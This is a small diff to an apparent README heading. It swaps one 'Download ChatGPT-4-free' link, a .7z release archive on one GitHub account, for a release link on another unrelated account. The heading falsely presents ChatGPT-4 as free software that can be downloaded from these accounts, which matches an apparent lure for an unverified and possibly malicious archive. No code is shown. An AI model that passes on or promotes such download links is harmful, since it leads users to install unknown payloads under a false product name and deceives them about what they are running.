@@ -1,4 +1,4 @@
-# [Download ChatGPT-4-free](https://github.com/brooklinyellow535/chatGPT-4-free/releases/download/v1.0.3/ChatGPT-4-free.7z)
+# [Download ChatGPT-4-free](https://github.com/romeo89mrdoors/romeo89mrdoors/releases/tag/v1.4.6)
 
 
 
